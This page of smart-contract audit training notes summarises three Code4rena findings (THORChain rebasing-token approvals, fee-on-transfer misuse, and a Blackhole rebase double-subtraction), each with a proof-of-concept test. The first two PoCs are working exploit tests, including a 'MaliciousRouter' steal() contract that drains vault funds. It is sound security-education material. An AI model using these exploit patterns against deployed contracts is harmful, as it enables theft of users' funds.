# ETAAcademy-Adudit: 10. Token

<table>
  <tr>
    <th>title</th>
    <th>tags</th>
  </tr>
  <tr>
    <td>10. Token</td>
    <td>
      <table>
        <tr>
          <th>audit</th>
          <th>basic</th>
          <th>EVM</th>
          <td>Token</td>
        </tr>
      </table>
    </td>
  </tr>
</table>

[Github](https://github.com/ETAAcademy)｜[Twitter](https://twitter.com/ETAAcademy)｜[ETA-Audit](https://github.com/ETAAcademy/ETAAcademy-Audit)

Authors: [Evta](https://twitter.com/pwhattie), looking forward to your joining

## 1. [High] A malicious user can steal money out of the vault and other users

### Calculating approvals for rebasing tokens

- Summary: A malicious user could exploit the rebasing mechanism of a token like AMPL to steal funds from the vault and other users. The issue arises because the protocol incorrectly handles the approval process for rebasing tokens. The malicious actor deposits 1000 AMPL tokens when the rebasing factor `_gonsPerFragment` is 1, and later, after the factor changes to 2, they can manipulate the system to withdraw more tokens than they originally deposited. This results in the depletion of funds for legitimate users, as the rebasing mechanism alters the token balances in the vault.

- Impact & Recommendation: The recommended fix involves correctly calculating approvals for rebasing tokens to prevent such exploits.

<br> 🐬: [Source](https://code4rena.com/reports/2024-06-thorchain#h-01-A-malicious-user-can-steal-money-out-of-the-vault-and-other-users) & [Report](https://code4rena.com/reports/2024-06-thorchain)

<details><summary>POC</summary>

```solidity

pragma solidity 0.8.22;
import "../lib/forge-std/src/Test.sol";
import {THORChain_Router} from "../chain/ethereum/contracts/THORChain_Router.sol";
contract AMPLTokenSimplified {
    uint256 public _gonsPerFragment = 1;
    mapping(address => uint256) public _gonBalances;
    mapping(address => mapping(address => uint256)) public _allowedFragments;
    function rebase(uint256 gonsPerFragment_) public {
        _gonsPerFragment = gonsPerFragment_;
    }
    function balanceOf(address who) public view returns (uint256) {
        return _gonBalances[who] / (_gonsPerFragment);
    }
    function transfer(address to, uint256 value)
        public
        returns (bool)
    {
        uint256 gonValue = value * (_gonsPerFragment);
        require(_gonBalances[msg.sender] >= gonValue, "You just got beamed lol");

        _gonBalances[msg.sender] = _gonBalances[msg.sender] - (gonValue);
        _gonBalances[to] = _gonBalances[to] + (gonValue);
        return true;
    }
    function allowance(address owner_, address spender) public view returns (uint256) {
        return _allowedFragments[owner_][spender];
    }
    function transferFrom(
        address from,
        address to,
        uint256 value
    ) public returns (bool) {
        _allowedFragments[from][msg.sender] = _allowedFragments[from][msg.sender] - (value);
        uint256 gonValue = value * (_gonsPerFragment);
        _gonBalances[from] = _gonBalances[from] - (gonValue);
        _gonBalances[to] = _gonBalances[to] + (gonValue);
        return true;
    }
    function approve(address spender, uint256 value) public returns (bool) {
        _allowedFragments[msg.sender][spender] = value;
        return true;
    }
    function mint(uint256 amount, address to) public {
        _gonBalances[to] = amount;
    }
}
contract StealMoney is Test {
  THORChain_Router tcRouter;
  AMPLTokenSimplified ampl;
  MaliciousRouter mRouter;
  address malicious = makeAddr('malicious');
  address victim = makeAddr('legit');
  address vault = makeAddr('legitVault');
  function setUp() public {
    tcRouter = new THORChain_Router();
    ampl = new AMPLTokenSimplified();
    mRouter = new MaliciousRouter();
    ampl.mint(1000, malicious);
    ampl.mint(2000, victim);
  }
  function testStealMoney() public {
    vm.startPrank(malicious);
    ampl.approve(address(tcRouter), type(uint256).max);
    tcRouter.depositWithExpiry(payable(malicious), address(ampl), 1000, "you are about to get beamed", type(uint256).max); // Malicious user deposits 1000 tokens
    vm.assertEq(tcRouter.vaultAllowance(malicious, address(ampl)), 1000); // Vault allowance for the malicious user is 1000 tokens
    vm.assertEq(ampl.balanceOf(address(tcRouter)), 1000); // Balance of contract is 1000 tokens
    ampl.rebase(2); // Set _gonsPerFragment to 2
    // Still pranking malicious
    tcRouter.transferAllowance(address(mRouter), malicious, address(ampl), 1000, "lol"); // This just approves 1000 tokens to spend to our malicious router
    vm.assertEq(tcRouter.vaultAllowance(malicious, address(ampl)), 0);
    vm.assertEq(ampl.balanceOf(address(tcRouter)), 500); // Balance is now 500 because _gonsPerFragment is 2
    vm.assertEq(ampl.allowance(address(tcRouter), address(mRouter)), 1000); // Malicious router has been approved for 1000 tokens
    vm.stopPrank();
    vm.startPrank(victim);
    ampl.approve(address(tcRouter), type(uint256).max);
    tcRouter.depositWithExpiry(payable(vault), address(ampl), 1000, "i am about to get beamed :(", type(uint256).max);
    vm.assertEq(tcRouter.vaultAllowance(vault, address(ampl)), 1000); // Allowance for vault is 1000 tokens
    vm.assertEq(ampl.balanceOf(address(tcRouter)), 1500); // Contract has 1500 tokens
    vm.stopPrank();
    uint256 maliciousBalanceBefore = ampl.balanceOf(malicious);
    mRouter.steal(1000, address(tcRouter), malicious, address(ampl)); // 1000 tokens to be sent from the router to the malicious guy
    uint256 maliciousBalanceAfter = ampl.balanceOf(malicious);
    assertEq(maliciousBalanceBefore, 0);
    assertEq(maliciousBalanceAfter, 1000); // 2000 / 2
    // Did not even lose money
    vm.assertEq(ampl.balanceOf(address(tcRouter)), 500); // Only 500 tokens left in the contract
    vm.startPrank(vault);
    // vm.expectRevert("You just got beamed lol");  // You can uncomment this line and paste this error message as the require statement error message after the transfer call to see this is where it reverts in transferOut()
    vm.expectRevert();
    tcRouter.transferOut(payable(victim), address(ampl), 1000, "did I just get beamed?...");
    uint256 victimBalanceBefore = ampl.balanceOf(victim);
    tcRouter.transferOut(payable(victim), address(ampl), 500, "omg I can only withdraw 500 tokens..");
    vm.stopPrank();

    uint256 victimBalanceAfter = ampl.balanceOf(victim);
    assertEq(victimBalanceBefore, 0);
    assertEq(victimBalanceAfter, 500);
  }
}
contract MaliciousRouter {
    function depositWithExpiry(address, address, uint256, string calldata, uint) public {}
    function steal(uint256 amount, address from, address to, address target) public {
        (bool ok, ) = target.call(abi.encodeWithSignature("transferFrom(address,address,uint256)", from, to, amount));
        if (!ok) revert();
    }
}

```

</details>

## 2. [Medium] Incorrect call argument in THORChain_Router::`_transferOutAndCallV5`, leading to grief/steal of THORChain_Aggregator’s funds or DoS

### Charge fees on transfer

- Summary: The `_transferOutAndCallV5` function transfers tokens to the THORChain_Aggregator and then calls swapOutV5 with the same amount. However, if the token charges a fee on transfer, the THORChain_Aggregator might not receive the full amount, causing the swapOutV5 call to fail or allowing a malicious actor to steal or lock funds.

- Impact & Recommendation: Implement a safe transfer function to correctly handle tokens that charge fees on transfer, ensuring the actual transferred amount is used in subsequent operations.

<br> 🐬: [Source](https://code4rena.com/reports/2024-06-thorchain#m-01-Incorrect-call-argument-in-THORChain_Router::_transferOutAndCallV5,-leading-to-grief/steal-of-THORChain_Aggregator’s-funds-or-DoS) & [Report](https://code4rena.com/reports/2024-06-thorchain)

<details><summary>POC</summary>

```solidity

const Router = artifacts.require('THORChain_Router');
const Aggregator = artifacts.require('THORChain_Aggregator');
const FailingAggregator = artifacts.require('THORChain_Failing_Aggregator');
const SushiRouter = artifacts.require('SushiRouterSmol');
const Token = artifacts.require('FeeOnTransferERC20Token');
const Weth = artifacts.require('WETH');
const BigNumber = require('bignumber.js');
const { expect } = require('chai');
function BN2Str(BN) {
  return new BigNumber(BN).toFixed();
}
function getBN(BN) {
  return new BigNumber(BN);
}
var ROUTER;
var ASGARD;
var AGG;
var WETH;
var SUSHIROUTER;
var FEE_ON_TRANSFER_TOKEN;
var WETH;
var ETH = '0x0000000000000000000000000000000000000000';
var USER1;
const _1 = '1000000000000000000';
const _10 = '10000000000000000000';
const _20 = '20000000000000000000';
const transferFee = '1000000';
const currentTime = Math.floor(Date.now() / 1000 + 15 * 60); // time plus 15 mins
describe('Aggregator griefing', function () {
  let accounts;
  before(async function () {
    accounts = await web3.eth.getAccounts();
    ROUTER = await Router.new();
    FEE_ON_TRANSFER_TOKEN = await Token.new(transferFee); // User gets 1m TOKENS during construction
    USER1 = accounts[0];
    ASGARD = accounts[3];
    WETH = await Weth.new();
    SUSHIROUTER = await SushiRouter.new(WETH.address);
    AGG = await Aggregator.new(WETH.address, SUSHIROUTER.address);
    FAIL_AGG = await FailingAggregator.new(WETH.address, SUSHIROUTER.address);
  });
  it('Should Deposit Assets to Router', async function () {
    await web3.eth.sendTransaction({
      to: SUSHIROUTER.address,
      from: USER1,
      value: _10,
    });
    await web3.eth.sendTransaction({
      to: WETH.address,
      from: USER1,
      value: _10,
    });
    await WETH.transfer(SUSHIROUTER.address, _10);
    expect(BN2Str(await web3.eth.getBalance(SUSHIROUTER.address))).to.equal(
      _10
    );
    expect(BN2Str(await WETH.balanceOf(SUSHIROUTER.address))).to.equal(_10);
  });
  it("Should grief/steal Aggregator's tokens on Swap Out using AggregatorV5 with FEE_ON_TRANSFER_TOKEN", async function () {
    /*
      Mint FEE_ON_TRANSFER_TOKEN the aggregator
      This mocks a situation where the swapOutV5 has failed and vault's tokens are in the aggregator
    */
    await FEE_ON_TRANSFER_TOKEN.mint(AGG.address, _20);
    /* Get starting balances of the FEE_ON_TRANSFER_TOKEN */
    const startingTokenBalanceOfUser1 = await FEE_ON_TRANSFER_TOKEN.balanceOf(
      USER1
    );
    const startingTokenBalanceOfAggregator =
      await FEE_ON_TRANSFER_TOKEN.balanceOf(AGG.address);
    const startingTokenBalanceOfSushiRouter =
      await FEE_ON_TRANSFER_TOKEN.balanceOf(SUSHIROUTER.address);
    /* Log starting balances */
    console.log(
      'Starting FEE_ON_TRANSFER_TOKEN Balance USER1:',
      BN2Str(startingTokenBalanceOfUser1)
    );
    console.log(
      'Starting FEE_ON_TRANSFER_TOKEN Balance SUSHIROUTER:',
      BN2Str(startingTokenBalanceOfSushiRouter)
    );
    console.log(
      'Starting FEE_ON_TRANSFER_TOKEN Balance Aggregator:',
      BN2Str(startingTokenBalanceOfAggregator)
    );
    /* User1 deposits tokens in the ASGARD vault */
    /* Remember that the vault will be credited _20 - transferFee */
    await FEE_ON_TRANSFER_TOKEN.approve(ROUTER.address, _20, { from: USER1 });
    await ROUTER.depositWithExpiry(
      ASGARD,
      FEE_ON_TRANSFER_TOKEN.address,
      _20,
      '',
      currentTime,
      {
        from: USER1,
      }
    );
    /* Log token balance of Router and the accounted allowance after deposit */
    const tokenBalanceOfRouter = await FEE_ON_TRANSFER_TOKEN.balanceOf(
      ROUTER.address
    );
    console.log(
      '\nFEE_ON_TRANSFER_TOKEN Balance Router:',
      BN2Str(tokenBalanceOfRouter)
    );
    expect(
      BN2Str(await FEE_ON_TRANSFER_TOKEN.balanceOf(ROUTER.address))
    ).to.equal(BN2Str(getBN(_20).minus(transferFee))); // after FEE_ON_TRANSFER_TOKEN deposit
    /*
      The ASGARD initiates a transfer out and call
      This action transfers _1 token to the aggregator,
      BUT the aggreagator receives _1 - transferFee because of the fee-on-transfer.
      The code in the router calls swapOutV5 with the _1, not _1 - transferFee.
      This will make the transaction to revert if the aggregator does not have enough tokens,
      because the swapOutV5 function will try to transfer _1 token, but it has _1 - transferFee.
      OR (like) in our case, the aggregator has tokens that should be rescued and the swapOutV5 is called with _1
      and the transfer fee is paid by the funds that should be rescued
     */
    const swaps = 7;
    const swapAmount = _1;
    for (let i = 0; i < swaps; i++) {
      await ROUTER.transferOutAndCallV5(
        [
          AGG.address,
          FEE_ON_TRANSFER_TOKEN.address,
          swapAmount,
          ETH,
          USER1,
          '0',
          'MEMO',
          '0x', // empty payload
          'bc123', // dummy address
        ],
        { from: ASGARD, value: 0 }
      );
    }
    /* Calculate total transfer fee paid */
    const totalAmountSwapped = getBN(swapAmount).multipliedBy(swaps);
    const totalTransferFeePaid = getBN(transferFee).multipliedBy(swaps);
    /* Get ending balances of the FEE_ON_TRANSFER_TOKEN */
    const endingTokenBalanceOfUser1 = await FEE_ON_TRANSFER_TOKEN.balanceOf(
      USER1
    );
    const endingTokenBalanceOfAggregator =
      await FEE_ON_TRANSFER_TOKEN.balanceOf(AGG.address);
    const endingTokenBalanceOfRouter = await FEE_ON_TRANSFER_TOKEN.balanceOf(
      ROUTER.address
    );
    const endingTokenBalanceOfSushiRouter =
      await FEE_ON_TRANSFER_TOKEN.balanceOf(SUSHIROUTER.address);
    /* Log starting balances */
    console.log(
      '\nFinal FEE_ON_TRANSFER_TOKEN Balance Aggregator:',
      BN2Str(endingTokenBalanceOfAggregator)
    );
    console.log(
      'Final FEE_ON_TRANSFER_TOKEN Balance USER1:',
      BN2Str(endingTokenBalanceOfUser1)
    );
    console.log(
      'Final FEE_ON_TRANSFER_TOKEN Balance SUSHIROUTER:',
      BN2Str(endingTokenBalanceOfSushiRouter)
    );
    console.log(
      'Final FEE_ON_TRANSFER_TOKEN Balance ROUTER:',
      BN2Str(endingTokenBalanceOfRouter)
    );
    /* Make assertions */
    /* Less 1 FEE_ON_TRANSFER_TOKEN - transfer fee (only one transfer User1 -> Router) */
    expect(
      BN2Str(await FEE_ON_TRANSFER_TOKEN.balanceOf(ROUTER.address))
    ).to.equal(BN2Str(getBN(_20).minus(totalAmountSwapped).minus(transferFee)));
    /* Add 1 FEE_ON_TRANSFER_TOKEN - (transfer fee) * swaps */
    expect(
      BN2Str(await FEE_ON_TRANSFER_TOKEN.balanceOf(SUSHIROUTER.address))
    ).to.equal(BN2Str(getBN(totalAmountSwapped).minus(totalTransferFeePaid)));
    /* KEY ASSERTIONS */
    /* Expect aggregator's funds to be rescued to be less than starting ones */
    expect(
      getBN(endingTokenBalanceOfAggregator).isLessThan(
        getBN(startingTokenBalanceOfAggregator)
      )
    ).to.equal(true);
  });
});

```

</details>

## 3. [Medium] MinterUpgradeable: double-subtracting smNFT burns causes rebase underpayment

### Double-subtraction causes rebase underpayment

- Summary: This is a double-subtraction token allocation error vulnerability: In the Blackhole protocol, creating Supermassive NFTs (smNFTs) burns BLACK tokens, automatically reducing `totalSupply()`, but the `calculate_rebase()` function incorrectly subtracts the smNFT token amount again from the already-reduced total supply (`circulatingBlack = _blackTotal - _veTotal - _smNFTBalance`), causing circulating supply to be underestimated. Since the rebase formula contains a squared term, this error is mathematically amplified, ultimately resulting in significantly reduced rebase rewards for `LPs/stakers` while veBLACK voters controlling gauges receive excessive allocations, systematically breaking the protocol's economic incentive balance.

- Impact & Recommendation: `The fix is to remove the duplicate subtraction: circulatingBlack = _blackTotal - _veTotal.`

<br> 🐬: [Source](https://code4rena.com/reports/2025-05-blackhole#m-01-minterupgradeable-double-subtracting-smnft-burns-causes-rebase-underpayment) & [Report](https://code4rena.com/reports/2025-05-blackhole)

<details><summary>POC</summary>

```solidity
const { expect } = require("chai");
const { ethers, network } = require("hardhat");
describe("MinterUpgradeable - Rebase Miscalculation PoC", function () {
    let deployer, user1, team; // Signers
    let blackToken, votingEscrow, minter, gaugeManagerMock, rewardsDistributorMock, blackGovernorMock;
    let votingBalanceLogic, votingDelegationLib; // Libraries

    const WEEK = 1800;
    const PRECISION = ethers.BigNumber.from("10000");
    const TOKEN_DECIMALS = 18; // For formatting ethers

    async function setupContracts() {
        [deployer, user1, team] = await ethers.getSigners();
        const BlackFactory = await ethers.getContractFactory("Black");
        blackToken = await BlackFactory.deploy();
        await blackToken.deployed();

        if (!(await blackToken.initialMinted())) {
            await blackToken.connect(deployer).initialMint(deployer.address);
        }

        const initialUserTokens = ethers.utils.parseEther("1000000");
        await blackToken.connect(deployer).transfer(user1.address, initialUserTokens);

        const VotingBalanceLogicFactory = await ethers.getContractFactory("VotingBalanceLogic");
        votingBalanceLogic = await VotingBalanceLogicFactory.deploy();
        await votingBalanceLogic.deployed();

        const VotingDelegationLibFactory = await ethers.getContractFactory("VotingDelegationLib");
        votingDelegationLib = await VotingDelegationLibFactory.deploy();
        await votingDelegationLib.deployed();

        const VotingEscrowFactory = await ethers.getContractFactory("VotingEscrow", {
            libraries: { VotingBalanceLogic: votingBalanceLogic.address },
        });
        votingEscrow = await VotingEscrowFactory.deploy(blackToken.address, ethers.constants.AddressZero, ethers.constants.AddressZero);
        await votingEscrow.deployed();
        if ((await votingEscrow.team()) !== team.address) {
            await votingEscrow.connect(deployer).setTeam(team.address);
        }

        const GaugeManagerMockFactory = await ethers.getContractFactory("GaugeManagerMock");
        gaugeManagerMock = await GaugeManagerMockFactory.deploy();
        await gaugeManagerMock.deployed();

        const RewardsDistributorMockFactory = await ethers.getContractFactory("RewardsDistributorMock");
        rewardsDistributorMock = await RewardsDistributorMockFactory.deploy();
        await rewardsDistributorMock.deployed();

        const BlackGovernorMockFactory = await ethers.getContractFactory("BlackGovernorMock");
        blackGovernorMock = await BlackGovernorMockFactory.deploy();
        await blackGovernorMock.deployed();
        await gaugeManagerMock.setBlackGovernor(blackGovernorMock.address);

        const MinterFactory = await ethers.getContractFactory("MinterUpgradeable");
        minter = await MinterFactory.deploy();
        await minter.deployed();
        await minter.connect(deployer).initialize(gaugeManagerMock.address, votingEscrow.address, rewardsDistributorMock.address);
        if ((await minter.team()) !== team.address) {
            await minter.connect(deployer).setTeam(team.address);
            await minter.connect(team).acceptTeam();
        }
        await minter.connect(deployer)._initialize([], [], 0);
        await blackToken.connect(deployer).setMinter(minter.address);
        await blackToken.connect(user1).approve(votingEscrow.address, ethers.constants.MaxUint256);
    }

    async function advanceToNextMintingPeriod(minterContract) {
        let currentActivePeriod = await minterContract.active_period();
        let currentTime = ethers.BigNumber.from((await ethers.provider.getBlock('latest')).timestamp);
        let targetTimeForUpdate = currentActivePeriod.add(WEEK);

        if (currentTime.lt(targetTimeForUpdate)) {
            const timeToAdvance = targetTimeForUpdate.sub(currentTime).toNumber();
            if (timeToAdvance > 0) {
                await network.provider.send("evm_increaseTime", [timeToAdvance]);
            }
        }
        await network.provider.send("evm_mine"); // Mine a block regardless to update timestamp
    }
    // Helper function to format BigNumbers consistently for logging
    function formatBN(bn) {
        return ethers.utils.formatUnits(bn, TOKEN_DECIMALS);
    }

    it("should have correct rebase when smNFTBalance is zero", async function () {
        await setupContracts();
        const lockAmount = ethers.utils.parseEther("10000");
        const lockDuration = WEEK * 52;
        await votingEscrow.connect(user1).create_lock(lockAmount, lockDuration, false /* isSMNFT */);

        await advanceToNextMintingPeriod(minter);
        const veTotal = await blackToken.balanceOf(votingEscrow.address);
        const blackTotal = await blackToken.totalSupply();
        const smNFTBalance = await votingEscrow.smNFTBalance();
        const superMassiveBonus = await votingEscrow.calculate_sm_nft_bonus(smNFTBalance);
        const weeklyEmission = await minter.weekly();

        console.log("\n--- Test Case: smNFTBalance is ZERO ---");
        console.log("  veTotal:", formatBN(veTotal));
        console.log("  blackTotal:", formatBN(blackTotal));
        console.log("  smNFTBalance:", formatBN(smNFTBalance)); // Should be 0
        console.log("  superMassiveBonus:", formatBN(superMassiveBonus)); // Should be 0
        console.log("  Weekly Mint:", formatBN(weeklyEmission));
        const rebaseContract = await minter.calculate_rebase(weeklyEmission);
        console.log("  Rebase (Contract):", formatBN(rebaseContract));

        // Corrected calculation (should match contract when smNFTBalance is 0)
        // Contract's circulatingBlack = blackTotal - veTotal - smNFTBalance
        // Corrected circulatingBlack = blackTotal - veTotal
        // Since smNFTBalance is 0, these are the same.
        const correctedCirculating = blackTotal.sub(veTotal);
        const correctedDenominator = blackTotal.add(superMassiveBonus); // bonus is 0

        let correctedRebase = ethers.BigNumber.from(0);
        if (!correctedDenominator.isZero() && correctedCirculating.gte(0)) {
            const numSq = correctedCirculating.mul(correctedCirculating);
            const denSqTimes2 = correctedDenominator.mul(correctedDenominator).mul(2);
            if(!denSqTimes2.isZero()) {
                correctedRebase = weeklyEmission.mul(numSq).div(denSqTimes2);
            }
        }
        console.log("  Rebase (Corrected):", formatBN(correctedRebase));

        expect(smNFTBalance).to.equal(0, "smNFTBalance should be zero for this test case");
        const diff = rebaseContract.sub(correctedRebase).abs();
        // Allow for extremely small dust if any fixed point math slightly differs, though should be equal
        const tolerance = ethers.utils.parseUnits("1", "wei");
        expect(diff).to.be.lte(tolerance, "Rebase calculations should be identical when smNFTBalance is zero");
    });

it("should demonstrate rebase miscalculation when smNFTBalance is positive", async function () {
        await setupContracts(); // Ensure fresh state for this test
        const lockAmount = ethers.utils.parseEther("10000");
        const smNFTLockAmount = ethers.utils.parseEther("50000");
        const lockDuration = WEEK * 52 * 1;

        await votingEscrow.connect(user1).create_lock(lockAmount, lockDuration, false /* isSMNFT */);
        await votingEscrow.connect(user1).create_lock(smNFTLockAmount, lockDuration, true /* isSMNFT */);

        await advanceToNextMintingPeriod(minter);

        const veTotal_before = await blackToken.balanceOf(votingEscrow.address);
        const blackTotal_before = await blackToken.totalSupply();
        const smNFTBalance_before = await votingEscrow.smNFTBalance();

        const superMassiveBonus_before = await votingEscrow.calculate_sm_nft_bonus(smNFTBalance_before);

        const weeklyEmission_for_period = await minter.weekly();
        console.log("\n--- Test Case: smNFTBalance is POSITIVE ---");
        console.log("State BEFORE Minter.update_period / calculate_rebase (Revised Inputs):");
        console.log("  veTotal (tokens in VE for normal/perm locks):", formatBN(veTotal_before));
        console.log("  blackTotal (actual totalSupply after smNFT burn):", formatBN(blackTotal_before));
        console.log("  smNFTBalance (sum of original principals burned for smNFTs):", formatBN(smNFTBalance_before));
        console.log("  superMassiveBonus (conceptual bonus on smNFTBalance):", formatBN(superMassiveBonus_before));
        console.log("  Weekly Mint for this period (emission to be distributed):", formatBN(weeklyEmission_for_period));

        const rebaseAmount_from_contract_calc = await minter.calculate_rebase(weeklyEmission_for_period);        console.log("Rebase Amount calculated BY CONTRACT'S LOGIC:", formatBN(rebaseAmount_from_contract_calc));

        // Corrected Logic: circulatingBlack should NOT double-subtract smNFTBalance
        const corrected_circulatingBlack = blackTotal_before.sub(veTotal_before); // Numerator: BT - VT

        // Corrected Denominator: actual total supply + conceptual bonus
        const corrected_blackSupply_denominator = blackTotal_before.add(superMassiveBonus_before); // Denominator: BT + B

        console.log("\nFor Manual/Corrected Calculation:");
        console.log("  Corrected Circulating Black (ActualCirculating):", formatBN(corrected_circulatingBlack));
        console.log("  Corrected Black Supply Denominator (ActualTotalSupply + Bonus):", formatBN(corrected_blackSupply_denominator));

        let corrected_rebaseAmount = ethers.BigNumber.from(0);
        if (!corrected_blackSupply_denominator.isZero() && corrected_circulatingBlack.gte(0)) {
            const num_squared = corrected_circulatingBlack.mul(corrected_circulatingBlack);
            const den_squared_times_2 = corrected_blackSupply_denominator.mul(corrected_blackSupply_denominator).mul(2);
            if (!den_squared_times_2.isZero()) {
                 corrected_rebaseAmount = weeklyEmission_for_period.mul(num_squared).div(den_squared_times_2);
            }
        }

        console.log("Rebase Amount calculated MANUALLY (Corrected Logic):", formatBN(corrected_rebaseAmount));


        const expected_misallocated_rebase = corrected_rebaseAmount.sub(rebaseAmount_from_contract_calc);
        console.log("Expected Misallocated Rebase (Corrected - Contract):", formatBN(expected_misallocated_rebase));

        // --- Assertions for Vulnerable Outcome ---

        expect(smNFTBalance_before).to.be.gt(0, "Test setup failed: smNFTBalance should be positive for this test case");
        expect(rebaseAmount_from_contract_calc).to.be.lt(corrected_rebaseAmount, "Contract's rebase should be less than corrected rebase when smNFTs exist");
        expect(expected_misallocated_rebase).to.be.gt(0, "Expected misallocated rebase amount should be greater than zero");

        // --- Demonstrate Upstream Impact on State ---

        const rewardsDistributor_bal_before_mint = await blackToken.balanceOf(rewardsDistributorMock.address);
        const minterTeamAddress = await minter.team();
        const team_bal_before_mint = await blackToken.balanceOf(minterTeamAddress);
        const gaugeManager_allowance_before_mint = await blackToken.allowance(minter.address, gaugeManagerMock.address);

// Calculate expected team and gauge amounts based on BOTH contract's flawed rebase AND corrected rebase
        const teamRate = await minter.teamRate();
        const MAX_BPS = await minter.MAX_BPS();

        const teamEmission_contract = weeklyEmission_for_period.mul(teamRate).div(MAX_BPS);
        const gaugeEmission_contract = weeklyEmission_for_period.sub(rebaseAmount_from_contract_calc).sub(teamEmission_contract);

        const teamEmission_corrected = weeklyEmission_for_period.mul(teamRate).div(MAX_BPS); // team emission is same
        const gaugeEmission_corrected = weeklyEmission_for_period.sub(corrected_rebaseAmount).sub(teamEmission_corrected);

        console.log("\n--- Predicted Distribution (based on contract's flawed rebase) ---");
        console.log("  Predicted Rebase to Distributor:", formatBN(rebaseAmount_from_contract_calc));
        console.log("  Predicted Emission to Team:", formatBN(teamEmission_contract));
        console.log("  Predicted Emission to Gauges:", formatBN(gaugeEmission_contract));
        console.log("\n--- Predicted Distribution (based on CORRECTED rebase) ---");
        console.log("  Predicted Rebase to Distributor (Corrected):", formatBN(corrected_rebaseAmount));
        console.log("  Predicted Emission to Team (Corrected):", formatBN(teamEmission_corrected));
        console.log("  Predicted Emission to Gauges (Corrected):", formatBN(gaugeEmission_corrected));

        // Execute the minting period update
        await minter.connect(deployer).update_period();

        const rewardsDistributor_bal_after_mint = await blackToken.balanceOf(rewardsDistributorMock.address);
        const team_bal_after_mint = await blackToken.balanceOf(minterTeamAddress);
        const gaugeManager_allowance_after_mint = await blackToken.allowance(minter.address, gaugeManagerMock.address);
        const rebase_actually_paid = rewardsDistributor_bal_after_mint.sub(rewardsDistributor_bal_before_mint);
        const team_actually_paid = team_bal_after_mint.sub(team_bal_before_mint);
        const gauge_actually_approved = gaugeManager_allowance_after_mint.sub(gaugeManager_allowance_before_mint); // Assuming allowance starts at 0 or reset
        console.log("\n--- Actual Distribution After Minter.update_period() ---");
        console.log("  Actual Rebase Paid to RewardsDistributor:", formatBN(rebase_actually_paid));
        console.log("  Actual Emission Paid to Team:", formatBN(team_actually_paid));
        console.log("  Actual Emission Approved for GaugeManager:", formatBN(gauge_actually_approved));

        // Assert that actual payments match the contract's flawed calculations
        expect(rebase_actually_paid).to.equal(rebaseAmount_from_contract_calc, "Actual rebase paid should match contract's flawed calculation");
        expect(team_actually_paid).to.equal(teamEmission_contract, "Actual team emission should match contract's calculation");
        expect(gauge_actually_approved).to.equal(gaugeEmission_contract, "Actual gauge approval should match contract's calculation");

        // Assert that gauge emission is higher than it should be
        expect(gauge_actually_approved).to.be.gt(gaugeEmission_corrected, "Gauge emission is higher than it should be due to understated rebase");
        const excessToGauges = gauge_actually_approved.sub(gaugeEmission_corrected);
        expect(excessToGauges).to.equal(expected_misallocated_rebase, "Excess to gauges should equal the rebase misallocation");
    });
});

```

</details>
